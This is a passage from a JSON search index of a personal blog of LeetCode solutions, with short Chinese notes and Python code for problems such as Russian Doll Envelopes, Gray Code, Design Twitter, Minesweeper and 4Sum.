arr = [1,2,4,16,8,4]Output: false Constraints:\n0 \u003c= arr.length \u003c= 3 * 104arr.length is even.-105 \u003c= arr[i] \u003c= 105 Sol class Solution: def canReorderDoubled(self, arr: List[int]) -\u0026gt; bool: cnts = Counter(arr) ks = sorted(list(cnts.keys())) for k in ks: for _ in range(cnts[k]): for n in ([k*2,k//2] if k % 2 == 0 else [k*2]): if n in cnts: if cnts[n] == 1: del cnts[n] else: cnts[n] -= 1 if cnts[k] == 1: del cnts[k] else: cnts[k] -= 1 return not cnts ","permalink":"https://littlebees.github.io/2021/08/leetcode-954-array-of-doubled-pairs/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e乖乖sort\u003c/li\u003e\n\u003cli\u003e用到整數除法注意奇數\u003c/li\u003e\n\u003c/ol\u003e","title":"leetcode-954 - Array of Doubled Pairs"},{"content":"動機 看別人的解題心得之前純dp會過，但現在會吃TLE\u0026hellip;\ninsight: 固定一維做lis\nProblem You are given a 2D array of integers envelopes where envelopes[i] = [wi, hi] represents the width and the height of an envelope.\nOne envelope can fit into another if and only if both the width and height of one envelope are greater than the other envelope's width and height.\nReturn the maximum number of envelopes you can Russian doll (i.e., put one inside the other).\nNote: You cannot rotate an envelope.\nExample 1:\nInput: envelopes = [[5,4],[6,4],[6,7],[2,3]]Output: 3Explanation: The maximum number of envelopes you can Russian doll is 3 ([2,3] =\u003e [5,4] =\u003e [6,7]).Example 2:\nInput: envelopes = [[1,1],[1,1],[1,1]]Output: 1 Constraints:\nt1 \u003c= envelopes.length \u003c= 5000tenvelopes[i].length == 2t1 \u003c= wi, hi \u003c= 104 Sol class Solution: def maxEnvelopes(self, enp: List[List[int]]) -\u0026gt; int: enp.sort(key=lambda e: (e[0],-e[1])) lis = [] for e in enp: i = bisect_left(lis, e[1]) if i == len(lis): lis.append(e[1]) else: lis[i] = e[1] return len(lis) ","permalink":"https://littlebees.github.io/2021/08/leetcode-354-russian-doll-envelopes/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e看別人的解題心得之前純dp會過，但現在會吃TLE\u0026hellip;\u003c/p\u003e\n\u003cp\u003einsight: \u003cem\u003e固定一維做lis\u003c/em\u003e\u003c/p\u003e","title":"leetcode-354 - Russian Doll Envelopes"},{"content":"動機 為什麼我的interval merge這麼痛苦\ninsight: 只要sort過的list就可以直接當heap用\nProblem Given a data stream input of non-negative integers a1, a2, ..., an, summarize the numbers seen so far as a list of disjoint intervals.\nImplement the SummaryRanges class:\ntSummaryRanges() Initializes the object with an empty stream.tvoid addNum(int val) Adds the integer val to the stream.tint[][] getIntervals() Returns a summary of the integers in the stream currently as a list of disjoint intervals [starti, endi]. Example 1:\nInput[\"SummaryRanges\", \"addNum\", \"getIntervals\", \"addNum\", \"getIntervals\", \"addNum\", \"getIntervals\", \"addNum\", \"getIntervals\", \"addNum\", \"getIntervals\"][[], [1], [], [3], [], [7], [], [2], [], [6], []]Output[Algorithm, Leetcode, null, [[1, 1]], null, [[1, 1], [3, 3]], null, [[1, 1], [3, 3], [7, 7]], null, [[1, 3], [7, 7]], null, [[1, 3], [6, 7]]]ExplanationSummaryRanges summaryRanges = new SummaryRanges();summaryRanges.addNum(1); // arr = [1]summaryRanges.getIntervals(); // return [[1, 1]]summaryRanges.addNum(3); // arr = [1, 3]summaryRanges.getIntervals(); // return [[1, 1], [3, 3]]summaryRanges.addNum(7); // arr = [1, 3, 7]summaryRanges.getIntervals(); // return [[1, 1], [3, 3], [7, 7]]summaryRanges.addNum(2); // arr = [1, 2, 3, 7]summaryRanges.getIntervals(); // return [[1, 3], [7, 7]]summaryRanges.addNum(6); // arr = [1, 2, 3, 6, 7]summaryRanges.getIntervals(); // return [[1, 3], [6, 7]] Constraints:\nt0 \u003c= val \u003c= 104tAt most 3 * 104 calls will be made to addNum and getIntervals. Follow up: What if there are lots of merges and the number of disjoint intervals is small compared to the size of the data stream?\nSol 做interval merge，但是case很多很痛苦 就是因為想在insert時做merge就很痛苦\nclass SummaryRanges: def __init__(self): self.stream = [] # (end,start) def addNum(self, val: int) -\u0026gt; None: if not self.stream: self.stream.append([val,val]) return i = bisect_left(self.stream, [val,val]) if i == len(self.stream): end, start = self.stream[-1] if val == end+1: self.stream[-1][0] = val elif val == end or val == start: pass else: self.stream.append([val,val]) else: big_end, big_start = self.stream[i] small_end, small_start = self.stream[i-1] if small_end+1 == val and big_start-1 == val: self.stream[i][1] = self.stream[i-1][1] del self.stream[i-1] elif small_end+1 == val: self.stream[i-1][0] = val elif big_start-1 == val: self.stream[i][1] = val elif big_start \u0026lt;= val \u0026lt;= big_end or small_start \u0026lt;= val \u0026lt;= small_end: pass else: self.stream.insert(i,[val,val]) def getIntervals(self) -\u0026gt; List[List[int]]: return [v[::-1] for v in self.stream] 這裡就全部就給heap，有趣的是只要sort過的list就可以直接當heap用 剩下就是對最後一個interval做merge就簡單多了\nclass SummaryRanges: def __init__(self): self.arr = [] def addNum(self, val: int) -\u0026gt; None: heapq.heappush(self.arr, [val, val]) def getIntervals(self) -\u0026gt; List[List[int]]: intervals = [] while self.arr: currInterval = heapq.heappop(self.arr) if intervals and currInterval[0] \u0026lt;= intervals[-1][-1] + 1: intervals[-1][-1] = max(intervals[-1][-1], currInterval[1]) else: intervals.append(currInterval) self.arr = intervals return self.arr ","permalink":"https://littlebees.github.io/2021/08/leetcode-352-data-stream-as-disjoint-intervals/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e為什麼我的interval merge這麼痛苦\u003c/p\u003e\n\u003cp\u003einsight: \u003cem\u003e只要sort過的list就可以直接當heap用\u003c/em\u003e\u003c/p\u003e","title":"leetcode-352 - Data Stream as Disjoint Intervals"},{"content":"動機 找右邊的最小，之後重建tree\nProblem Given a root node reference of a BST and a key, delete the node with the given key in the BST. Return the root node reference (possibly updated) of the BST.\nBasically, the deletion can be divided into two stages:\ntSearch for a node to remove.tIf the node is found, delete the node.Follow up: Can you solve it with time complexity O(height of tree)?\nExample 1:\nInput: root = [5,3,6,2,4,Leetcode,7], key = 3Output: [5,4,6,2,null,null,7]Explanation: Given key to delete is 3. So we find the node with value 3 and delete it.One valid answer is [5,4,6,2,null,null,7], shown in the above BST.Please notice that another valid answer is [5,2,6,null,4,null,7] and it's also accepted.Example 2:\nInput: root = [5,3,6,2,4,null,7], key = 0Output: [5,3,6,2,4,null,7]Explanation: The tree does not contain a node with value = 0.Example 3:\nInput: root = [], key = 0Output: [] Constraints:\nThe number of nodes in the tree is in the range [0, 104].-105 \u003c= Node.val \u003c= 105Each node has a unique value.root is a valid binary search tree.-105 \u003c= key \u003c= 105 Sol class Solution: def deleteNode(self, root: Optional[TreeNode], key: int) -\u0026gt; Optional[TreeNode]: if not root: return None elif root.val \u0026gt; key: root.left = self.deleteNode(root.left, key) return root elif root.val \u0026lt; key: root.right = self.deleteNode(root.right, key) return root else: if not root.left and not root.right: return None elif not root.left: return root.right elif not root.right: return root.left else: # find min in root.right now = root.right prev = root while now.left: prev, now = now, now.left if now == root.right: # no left now.left = root.left else: prev.left = now.right now.left = root.left now.right = root.right return now ","permalink":"https://littlebees.github.io/2021/08/leetcode-450-delete-node-in-a-bst/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e找右邊的最小，之後重建tree\u003c/p\u003e","title":"leetcode-450 - Delete Node in a BST"},{"content":"動機 一個是直接幹，一個是mirror\nProblem An n-bit gray code sequence is a sequence of 2n integers where:\ntEvery integer is in the inclusive range [0, 2n - 1],tThe first integer is 0,tAn integer appears no more than once in the sequence,tThe binary representation of every pair of adjacent integers differs by exactly one bit, andtThe binary representation of the first and last integers differs by exactly one bit.Given an integer n, return any valid n-bit gray code sequence.\nExample 1:\nInput: n = 2Output: [0,1,3,2]Explanation:The binary representation of [0,1,3,2] is [00,01,11,10].- 00 and 01 differ by one bit- 01 and 11 differ by one bit- 11 and 10 differ by one bit- 10 and 00 differ by one bit[0,2,3,1] is also a valid gray code sequence, whose binary representation is [00,10,11,01].- 00 and 10 differ by one bit- 10 and 11 differ by one bit- 11 and 01 differ by one bit- 01 and 00 differ by one bitExample 2:\nInput: n = 1Output: [0,1] Constraints:\nt1 \u003c= n \u003c= 16 Sol 直接幹\ni是奇數就只改第一個位元 偶數就lowbit的右邊第一個位元\nclass Solution: def grayCode(self, n: int) -\u0026gt; List[int]: ret = [0] lowbit = lambda n: n\u0026amp;~(n-1) for i in range((1 \u0026lt;\u0026lt; n)-1): if i % 2 == 0: ret.append(ret[-1] ^ 1) else: ret.append(ret[-1] ^ (lowbit(ret[-1]) \u0026lt;\u0026lt; 1)) return ret mirror\nclass Solution: def grayCode(self, n: int) -\u0026gt; List[int]: if n == 1: return [0,1] else: prev = self.grayCode(n-1) return prev+[x+(1 \u0026lt;\u0026lt; (n-1)) for x in prev[::-1]] ","permalink":"https://littlebees.github.io/2021/08/leetcode-89-gray-code/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e一個是直接幹，一個是mirror\u003c/p\u003e","title":"leetcode-89 - Gray Code"},{"content":"動機 做完有種我不會dp的感覺\nProblem A binary string is monotone increasing if it consists of some number of 0's (possibly none), followed by some number of 1's (also possibly none).\nYou are given a binary string s. You can flip s[i] changing it from 0 to 1 or from 1 to 0.\nReturn the minimum number of flips to make s monotone increasing.\nExample 1:\nInput: s = \"00110\"Output: 1Explanation: We flip the last digit to get 00111.Example 2:\nInput: s = \"010110\"Output: 2Explanation: We flip to get 011111, or alternatively 000111.Example 3:\nInput: s = \"00011000\"Output: 2Explanation: We flip to get 00000000. Constraints:\nt1 \u003c= s.length \u003c= 105ts[i] is either '0' or '1'. Sol 原本是用divide and conquer去數\nclass Solution: def minFlipsMonoIncr(self, s: str) -\u0026gt; int: @cache def one(i,j): if j\u0026lt;=i: return 0 elif j-i == 1: return 0 if s[i:j] == \u0026#34;1\u0026#34; else 1 else: mid = (i+j)//2 return one(i,mid)+one(mid,mid+1)+one(mid+1,j) @cache def zero(i,j): if j\u0026lt;=i: return 0 elif j-i == 1: return 1 if s[i:j] == \u0026#34;1\u0026#34; else 0 else: mid = (i+j)//2 return zero(i,mid)+zero(mid,mid+1)+zero(mid+1,j) return min([zero(0,k)+one(k,len(s)) for k in range(0,len(s)+1)]) 但zero與one是互斥的，所以可以用一邊推出另一邊 但這樣還是n^2 log n\nclass Solution: def minFlipsMonoIncr(self, s: str) -\u0026gt; int: @cache def zero(i,j): if j\u0026lt;=i: return 0 elif j-i == 1: return 0 if s[i:j] == \u0026#34;1\u0026#34; else 1 else: mid = (i+j)//2 return zero(i,mid)+zero(mid,mid+1)+zero(mid+1,j) @cache def one(i,j): return (j-i)-zero(i,j) return min([zero(0,k)+one(k,len(s)) for k in range(0,len(s)+1)]) 怎麼快速算出one的數目? 或是說，one的總和? prefix sum\nclass Solution: def minFlipsMonoIncr(self, s: str) -\u0026gt; int: ones = [0] for c in s: ones.append(ones[-1]+(1 if c == \u0026#34;1\u0026#34; else 0)) @cache def zero(i,j): return ones[j]-ones[i] @cache def one(i,j): return (j-i)-zero(i,j) return min([zero(0,k)+one(k,len(s)) for k in range(0,len(s)+1)]) 另外只看最後一位會發現如果是1，可以直接接上去\n如果是0，不是把前面的1換成0，就是把自己這一位換成1，所以有下面的dp\nclass Solution: def minFlipsMonoIncr(self, s: str) -\u0026gt; int: ones = 0 dp = 0 for c in s: if c == \u0026#34;0\u0026#34;: dp = min(dp+1,ones) # 0 to 1, all 1 to 0 else: ones += 1 # append to the tail return dp ","permalink":"https://littlebees.github.io/2021/08/leetcode-926-flip-string-to-monotone-increasing/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e做完有種我不會dp的感覺\u003c/p\u003e","title":"leetcode-926 - Flip String to Monotone Increasing"},{"content":"動機 你大神還是你大神，滿滿的創意\n在BST上做bsearch(太神啦) 帶入範圍\nProblem Given an array of integers preorder, which represents the preorder traversal of a BST (i.e., binary search tree), construct the tree and return its root.\nIt is guaranteed that there is always possible to find a binary search tree with the given requirements for the given test cases.\nA binary search tree is a binary tree where for every node, any descendant of Node.left has a value strictly less than Node.val, and any descendant of Node.right has a value strictly greater than Node.val.\nA preorder traversal of a binary tree displays the value of the node first, then traverses Node.left, then traverses Node.right.\nExample 1:\nInput: preorder = [8,5,1,7,10,12]Output: [8,5,10,1,7,Leetcode,12]Example 2:\nInput: preorder = [1,3]Output: [1,null,3] Constraints:\nt1 \u003c= preorder.length \u003c= 100t1 \u003c= preorder[i] \u003c= 108tAll the values of preorder are unique. Sol 在preorder做bsearch，太神啦 範圍要sort? 不用不用 只要符合binary search就好!!\nclass Solution: def bstFromPreorder(self, preorder: List[int]) -\u0026gt; Optional[TreeNode]: def dfs(ns): if not ns: return None else: i = bisect.bisect(ns,ns[0]) ret = TreeNode(ns[0]) ret.left = dfs(ns[1:i]) ret.right = dfs(ns[i:]) return ret return dfs(preorder) 帶入範圍\nclass Solution: def bstFromPreorder(self, ns: List[int]) -\u0026gt; Optional[TreeNode]: i = 0 def dfs(limit=float(\u0026#39;inf\u0026#39;)): nonlocal i if i \u0026gt;= len(ns) or ns[i] \u0026gt; limit: return None else: ret = TreeNode(ns[i]) i += 1 ret.left = dfs(ret.val) ret.right = dfs(limit) return ret return dfs() ","permalink":"https://littlebees.github.io/2021/08/leetcode-1008-construct-binary-search-tree-from-preorder-traversal/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e你大神還是你大神，滿滿的創意\u003c/p\u003e\n\u003cp\u003e\u003cem\u003e在BST上做bsearch(太神啦)\u003c/em\u003e\n\u003cem\u003e帶入範圍\u003c/em\u003e\u003c/p\u003e","title":"leetcode-1008 - Construct Binary Search Tree from Preorder Traversal"},{"content":"動機 用prefix sum紀錄偏移到哪邊了\nProblem Given a binary array nums, return the maximum length of a contiguous subarray with an equal number of 0 and 1.\nExample 1:\nInput: nums = [0,1]Output: 2Explanation: [0, 1] is the longest contiguous subarray with an equal number of 0 and 1.Example 2:\nInput: nums = [0,1,0]Output: 2Explanation: [0, 1] (or [1, 0]) is a longest contiguous subarray with equal number of 0 and 1. Constraints:\nt1 \u003c= nums.length \u003c= 105tnums[i] is either 0 or 1. Sol 如果總和是0，就是平衡的，如果有多，只要把多的扣掉就好，就是prefix sum\nclass Solution: def findMaxLength(self, nums: List[int]) -\u0026gt; int: l2i = {0:-1} cnt,ret = 0,0 for (i,n) in enumerate([-1 if n == 0 else n for n in nums]): cnt += n if cnt in l2i: ret = max(i-l2i[cnt],ret) else: l2i[cnt] = i return ret ","permalink":"https://littlebees.github.io/2021/08/leetcode-525-contiguous-array/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e用prefix sum紀錄偏移到哪邊了\u003c/p\u003e","title":"leetcode-525 - Contiguous Array"},{"content":"動機 原本以為很複雜，結果異常的簡單\nProblem Design a simplified version of Twitter where users can post tweets, follow/unfollow another user, and is able to see the 10 most recent tweets in the user's news feed.\nImplement the Twitter class:\ntTwitter() Initializes your twitter object.tvoid postTweet(int userId, int tweetId) Composes a new tweet with ID tweetId by the user userId. Each call to this function will be made with a unique tweetId.tList getNewsFeed(int userId) Retrieves the 10 most recent tweet IDs in the user's news feed. Each item in the news feed must be posted by users who the user followed or by the user themself. Tweets must be ordered from most recent to least recent.tvoid follow(int followerId, int followeeId) The user with ID followerId started following the user with ID followeeId.tvoid unfollow(int followerId, int followeeId) The user with ID followerId started unfollowing the user with ID followeeId. Example 1:\nInput[\"Twitter\", \"postTweet\", \"getNewsFeed\", \"follow\", \"postTweet\", \"getNewsFeed\", \"unfollow\", \"getNewsFeed\"][[], [1, 5], [1], [1, 2], [2, 6], [1], [1, 2], [1]]Output[Algorithm, Leetcode, null, [5], null, null, [6, 5], null, [5]]ExplanationTwitter twitter = new Twitter();twitter.postTweet(1, 5); // User 1 posts a new tweet (id = 5).twitter.getNewsFeed(1); // User 1's news feed should return a list with 1 tweet id -\u003e [5]. return [5]twitter.follow(1, 2); // User 1 follows user 2.twitter.postTweet(2, 6); // User 2 posts a new tweet (id = 6).twitter.getNewsFeed(1); // User 1's news feed should return a list with 2 tweet ids -\u003e [6, 5]. Tweet id 6 should precede tweet id 5 because it is posted after tweet id 5.twitter.unfollow(1, 2); // User 1 unfollows user 2.twitter.getNewsFeed(1); // User 1's news feed should return a list with 1 tweet id -\u003e [5], since user 1 is no longer following user 2. Constraints:\nt1 \u003c= userId, followerId, followeeId \u003c= 500t0 \u003c= tweetId \u003c= 104tAll the tweets have unique IDs.tAt most 3 * 104 calls will be made to postTweet, getNewsFeed, follow, and unfollow. Sol from sortedcontainers import SortedList class Twitter: def __init__(self): self.u2ps = defaultdict(list) self.u2us = defaultdict(set) self.tick = 10000 def getUser(self,userId): if userId not in self.u2us: self.u2us[userId].add(userId) return userId def postTweet(self, userId: int, tweetId: int) -\u0026gt; None: self.u2ps[self.getUser(userId)].append((self.tick, tweetId)) self.tick -= 1 def getNewsFeed(self, userId: int) -\u0026gt; List[int]: hq = SortedList() for u in self.u2us[userId]: u = self.u2ps[u] [hq.add(x) for x in u[max(len(u)-10,0):]] return [p[1] for p in hq[:10]] def follow(self, followerId: int, followeeId: int) -\u0026gt; None: self.u2us[self.getUser(followerId)].add(self.getUser(followeeId)) def unfollow(self, followerId: int, followeeId: int) -\u0026gt; None: self.u2us[self.getUser(followerId)].discard(self.getUser(followeeId)) ","permalink":"https://littlebees.github.io/2021/08/leetcode-355-design-twitter/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e原本以為很複雜，結果異常的簡單\u003c/p\u003e","title":"leetcode-355 - Design Twitter"},{"content":"動機 BST的inorder就是sort過的list!! 忘了!!\nProblem Given the root of a binary search tree (BST) with duplicates, return all the mode(s) (i.e., the most frequently occurred element) in it.\nIf the tree has more than one mode, return them in any order.\nAssume a BST is defined as follows:\ntThe left subtree of a node contains only nodes with keys less than or equal to the node's key.tThe right subtree of a node contains only nodes with keys greater than or equal to the node's key.tBoth the left and right subtrees must also be binary search trees. Example 1:\nInput: root = [1,Leetcode,2,2]Output: [2]Example 2:\nInput: root = [0]Output: [0] Constraints:\ntThe number of nodes in the tree is in the range [1, 104].t-105 \u003c= Node.val \u003c= 105 Follow up: Could you do that without using any extra space? (Assume that the implicit stack space incurred due to recursion does not count). Sol dict統計\nclass Solution: def findMode(self, root: Optional[TreeNode]) -\u0026gt; List[int]: cnt = defaultdict(int) def dfs(r): if not r: return else: cnt[r.val] += 1 [dfs(x) for x in [r.left, r.right]] dfs(root) mode = max(cnt.values()) return [k for (k,v) in cnt.items() if v == mode] 利用inorder就是sort的特性去更新最大值\nclass Solution: def findMode(self, root: Optional[TreeNode]) -\u0026gt; List[int]: ret = [] maxCount = 0 curCount = 1 prevNum = None def inorder(r): nonlocal maxCount, curCount, prevNum, ret if not r: return else: inorder(r.left) if prevNum == r.val: curCount += 1 else: curCount = 1 if curCount == maxCount: ret.append(r.val) elif curCount \u0026gt; maxCount: maxCount = curCount ret = [r.val] prevNum = r.val inorder(r.right) inorder(root) return ret ","permalink":"https://littlebees.github.io/2021/08/leetcode-501-find-mode-in-binary-search-tree/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003eBST的inorder就是sort過的list!!\n忘了!!\u003c/p\u003e","title":"leetcode-501 - Find Mode in Binary Search Tree"},{"content":"動機 不管right leaf的dfs\nProblem Given the root of a binary tree, return the sum of all left leaves.\nExample 1:\nInput: root = [3,9,20,Leetcode,null,15,7]Output: 24Explanation: There are two left leaves in the binary tree, with values 9 and 15 respectively.Example 2:\nInput: root = [1]Output: 0 Constraints:\ntThe number of nodes in the tree is in the range [1, 1000].t-1000 \u003c= Node.val \u003c= 1000 Sol class Solution: def sumOfLeftLeaves(self, root: Optional[TreeNode]) -\u0026gt; int: def dfs(r): if not r: return 0 elif not r.left and not r.right: return r.val else: ret = dfs(r.left)+dfs(r.right) ret = ret-r.right.val if r.right and not r.right.left and not r.right.right else ret return ret if root and not root.left and not root.right: return 0 else: return dfs(root) ","permalink":"https://littlebees.github.io/2021/08/leetcode-404-sum-of-left-leaves/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e不管right leaf的dfs\u003c/p\u003e","title":"leetcode-404 - Sum of Left Leaves"},{"content":"動機 就之前的add two number\nProblem Given two non-negative integers, num1 and num2 represented as string, return the sum of num1 and num2 as a string.\nYou must solve the problem without using any built-in library for handling large integers (such as BigInteger). You must also not convert the inputs to integers directly.\nExample 1:\nInput: num1 = \"11\", num2 = \"123\"Output: \"134\"Example 2:\nInput: num1 = \"456\", num2 = \"77\"Output: \"533\"Example 3:\nInput: num1 = \"0\", num2 = \"0\"Output: \"0\" Constraints:\nt1 \u003c= num1.length, num2.length \u003c= 104tnum1 and num2 consist of only digits.tnum1 and num2 don't have any leading zeros except for the zero itself. Sol class Solution: def addStrings(self, num1: str, num2: str) -\u0026gt; str: a = num1[::-1] b = num2[::-1] def add(a,b,carry=0): if not a and not b: return \u0026#34;\u0026#34; if carry == 0 else str(carry) elif not a: return add(b,a,carry) elif not b: if carry == 1: return add(a,b+str(carry),0) else: return a else: tmp = int(a[0])+int(b[0])+carry return str(tmp%10)+add(a[1:],b[1:],tmp//10) return add(a,b)[::-1] ","permalink":"https://littlebees.github.io/2021/08/leetcode-415-add-strings/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e就之前的add two number\u003c/p\u003e","title":"leetcode-415 - Add Strings"},{"content":"動機 dfs去點格子\nProblem Let's play the minesweeper game (Wikipedia, online game)!\nYou are given an m x n char matrix board representing the game board where:\nt'M' represents an unrevealed mine,t'E' represents an unrevealed empty square,t'B' represents a revealed blank square that has no adjacent mines (i.e., above, below, left, right, and all 4 diagonals),tdigit ('1' to '8') represents how many mines are adjacent to this revealed square, andt'X' represents a revealed mine.You are also given an integer array click where click = [clickr, clickc] represents the next click position among all the unrevealed squares ('M' or 'E').\nReturn the board after revealing this position according to the following rules:\ntIf a mine 'M' is revealed, then the game is over. You should change it to 'X'.tIf an empty square 'E' with no adjacent mines is revealed, then change it to a revealed blank 'B' and all of its adjacent unrevealed squares should be revealed recursively.tIf an empty square 'E' with at least one adjacent mine is revealed, then change it to a digit ('1' to '8') representing the number of adjacent mines.tReturn the board when no more squares will be revealed. Example 1:\nInput: board = [[\"E\",\"E\",\"E\",\"E\",\"E\"],[\"E\",\"E\",\"M\",\"E\",\"E\"],[\"E\",\"E\",\"E\",\"E\",\"E\"],[\"E\",\"E\",\"E\",\"E\",\"E\"]], click = [3,0]Output: [[\"B\",\"1\",\"E\",\"1\",\"B\"],[\"B\",\"1\",\"M\",\"1\",\"B\"],[\"B\",\"1\",\"1\",\"1\",\"B\"],[\"B\",\"B\",\"B\",\"B\",\"B\"]]Example 2:\nInput: board = [[\"B\",\"1\",\"E\",\"1\",\"B\"],[\"B\",\"1\",\"M\",\"1\",\"B\"],[\"B\",\"1\",\"1\",\"1\",\"B\"],[\"B\",\"B\",\"B\",\"B\",\"B\"]], click = [1,2]Output: [[\"B\",\"1\",\"E\",\"1\",\"B\"],[\"B\",\"1\",\"X\",\"1\",\"B\"],[\"B\",\"1\",\"1\",\"1\",\"B\"],[\"B\",\"B\",\"B\",\"B\",\"B\"]] Constraints:\ntm == board.lengthtn == board[i].lengtht1 \u003c= m, n \u003c= 50tboard[i][j] is either 'M', 'E', 'B', or a digit from '1' to '8'.tclick.length == 2t0 \u003c= clickr \u003c mt0 \u003c= clickc \u003c ntboard[clickr][clickc] is either 'M' or 'E'. Sol 在空白時用dfs去點其他格子\ndef surroundMine(B,i,j): poses = [(i-1,j-1), (i-1,j), (i-1,j+1), (i,j-1), (i,j+1), (i+1,j-1), (i+1,j),(i+1,j+1)] return sum([1 if B[a][b] == \u0026#39;M\u0026#39; else 0 for (a,b) in poses if 0 \u0026lt;= a and a \u0026lt; len(B) and 0 \u0026lt;= b and b \u0026lt; len(B[a])]) def dfs(B,i,j): if 0 \u0026lt;= i and i \u0026lt; len(B) and 0 \u0026lt;= j and j \u0026lt; len(B[i]): if B[i][j] == \u0026#39;E\u0026#39;: num = surroundMine(B,i,j) if num == 0: B[i][j] = \u0026#39;B\u0026#39; poses = [(i-1,j-1), (i-1,j), (i-1,j+1), (i,j-1), (i,j+1), (i+1,j-1), (i+1,j),(i+1,j+1)] [dfs(B,a,b) for (a,b) in poses] else: B[i][j] = str(num) class Solution: def updateBoard(self, B: List[List[str]], c: List[int]) -\u0026gt; List[List[str]]: if B[c[0]][c[1]] != \u0026#39;M\u0026#39;: dfs(B,c[0],c[1]) else: B[c[0]][c[1]] = \u0026#39;X\u0026#39; return B ","permalink":"https://littlebees.github.io/2021/08/leetcode-529-minesweeper/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003edfs去點格子\u003c/p\u003e","title":"leetcode-529 - Minesweeper"},{"content":"動機 雞籠原理\nProblem Alice has n candies, where the ith candy is of type candyType[i]. Alice noticed that she started to gain weight, so she visited a doctor.\nThe doctor advised Alice to only eat n / 2 of the candies she has (n is always even). Alice likes her candies very much, and she wants to eat the maximum number of different types of candies while still following the doctor's advice.\nGiven the integer array candyType of length n, return the maximum number of different types of candies she can eat if she only eats n / 2 of them.\nExample 1:\nInput: candyType = [1,1,2,2,3,3]Output: 3Explanation: Alice can only eat 6 / 2 = 3 candies. Since there are only 3 types, she can eat one of each type.Example 2:\nInput: candyType = [1,1,2,3]Output: 2Explanation: Alice can only eat 4 / 2 = 2 candies. Whether she eats types [1,2], [1,3], or [2,3], she still can only eat 2 different types.Example 3:\nInput: candyType = [6,6,6,6]Output: 1Explanation: Alice can only eat 4 / 2 = 2 candies. Even though she can eat 2 candies, she only has 1 type. Constraints:\ntn == candyType.lengtht2 \u003c= n \u003c= 104tn is even.t-105 \u003c= candyType[i] \u003c= 105 Sol class Solution: def distributeCandies(self, candyType: List[int]) -\u0026gt; int: return min(len(set(candyType)), len(candyType)//2) ","permalink":"https://littlebees.github.io/2021/08/leetcode-575-distribute-candies/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e雞籠原理\u003c/p\u003e","title":"leetcode-575 - Distribute Candies"},{"content":"動機 用pointer去塞\nProblem Given an integer array nums, move all the even integers at the beginning of the array followed by all the odd integers.\nReturn any array that satisfies this condition.\nExample 1:\nInput: nums = [3,1,2,4]Output: [2,4,3,1]Explanation: The outputs [4,2,3,1], [2,4,1,3], and [4,2,1,3] would also be accepted.Example 2:\nInput: nums = [0]Output: [0] Constraints:\nt1 \u003c= nums.length \u003c= 5000t0 \u003c= nums[i] \u003c= 5000 Sol class Solution: def sortArrayByParity(self, nums: List[int]) -\u0026gt; List[int]: even, odd = 0, len(nums)-1 while even \u0026lt; odd: if nums[even] % 2 == 0: even += 1 elif nums[odd] % 2 == 1: odd -= 1 else: nums[even], nums[odd] = nums[odd],nums[even] even, odd = even+1, odd-1 return nums ","permalink":"https://littlebees.github.io/2021/08/leetcode-905-sort-array-by-parity/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e用pointer去塞\u003c/p\u003e","title":"leetcode-905 - Sort Array By Parity"},{"content":"動機 有剪枝差太多\nProblem Given an array nums of n integers, return an array of all the unique quadruplets [nums[a], nums[b], nums[c], nums[d]] such that:\nt0 \u003c= a, b, c, d \u003c nta, b, c, and d are distinct.tnums[a] + nums[b] + nums[c] + nums[d] == targetYou may return the answer in any order.\nExample 1:\nInput: nums = [1,0,-1,0,-2,2], target = 0Output: [[-2,-1,1,2],[-2,0,0,2],[-1,0,0,1]]Example 2:\nInput: nums = [2,2,2,2,2], target = 8Output: [[2,2,2,2]] Constraints:\nt1 \u003c= nums.length \u003c= 200t-109 \u003c= nums[i] \u003c= 109t-109 \u003c= target \u003c= 109 Sol 在k是大於2時，就用backtrack去生剩下的(k-1)sum，最後就是2sum\nclass Solution: def fourSum(self, nums: List[int], target: int) -\u0026gt; List[List[int]]: def sumk(ns, target, k): if len(ns) \u0026lt;= 1 or k \u0026lt;= 1 or ns[0]*k \u0026gt; target or target \u0026gt; ns[-1] *k: return [] elif k == 2: return sum2(ns,target) else: ret = [] for i in range(len(ns)): if i == 0 or ns[i-1] != ns[i]: subs = sumk(ns[i+1:],target-ns[i], k-1) if subs: ret += [[ns[i]]+sub for sub in subs] return ret def sum2(ns,target): ret = [] a,b = 0, len(ns)-1 while a\u0026lt;b: cnt = ns[a]+ns[b] if cnt == target: ret.append([ns[a],ns[b]]) while a \u0026lt;= b-1 and ns[b-1] == ns[b]: b -= 1 while a+1 \u0026lt;= b and ns[a+1] == ns[a]: a += 1 a,b = a+1, b-1 elif cnt \u0026gt; target: while a \u0026lt;= b-1 and ns[b-1] == ns[b]: b -= 1 b -= 1 else: while a+1 \u0026lt;= b and ns[a+1] == ns[a]: a += 1 a += 1 return ret nums.sort() return sumk(nums,target,4) ","permalink":"https://littlebees.github.io/2021/08/leetcode-18-4sum/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e有剪枝差太多\u003c/p\u003e","title":"leetcode-18 - 4Sum"},{"content":"動機 人生第一次凸包\nProblem You are given an array trees where trees[i] = [xi, yi] represents the location of a tree in the garden.\nYou are asked to fence the entire garden using the minimum length of rope as it is expensive. The garden is well fenced only if all the trees are enclosed.\nReturn the coordinates of trees that are exactly located on the fence perimeter.\nExample 